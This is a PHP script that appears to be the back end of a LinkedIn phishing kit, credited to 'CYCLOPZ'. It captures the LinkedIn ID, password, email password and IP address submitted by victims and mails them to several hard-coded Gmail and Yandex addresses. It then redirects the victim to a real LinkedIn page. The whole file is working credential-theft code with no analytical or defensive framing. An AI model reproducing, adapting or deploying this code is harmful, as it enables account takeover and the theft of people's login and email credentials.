<?
$country = '';
$IP = $_SERVER['REMOTE_ADDR'];


date_default_timezone_set("Africa/Lagos");
$log_date = date('d/m/Y - h:i:s');

$ip = getenv("REMOTE_ADDR");
$message .= "-------------- LoginZ obi-alf By CYCLOPZ-----------------------\n";
$message .= "Linkedin !ID: ".$_POST['session_key']."\n";
$message .= "Password: ".$_POST['pass']."\n";
$message .= "Email-Password: ".$_POST['paasv']."\n";
$message .= "IP: ".$IP."\n";
$message .= "Date : ".$log_date."\n";
$message .="Country : ".$country."\n";

$message .= "---------------Created obi-alf By bobychenko------------------------------\n";


$to = "chloe.t.williams009@gmail.com,obiorahg@gmail.com";
$recipient = "revolut007@gmail.com,supercool.oop@yandex.com";
$subject = "Linkedin obi-alf LOGIN";
$headers = "From:Logz obi-alf By CYCLOPZ<CYCLOPZ@CYCLOPZ.COM>";
$headers .= $_POST['name']."\n";
$headers .= "MIME-Version: 1.0\n";
	 mail($to, "Linkedin obi-alf Login", $message);
if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: http://www.linkedin.com/pub/dir/Import/Export");

	   }
else
    	   {
 		echo "ERROR! Please go back and try again.";
  	   }

?>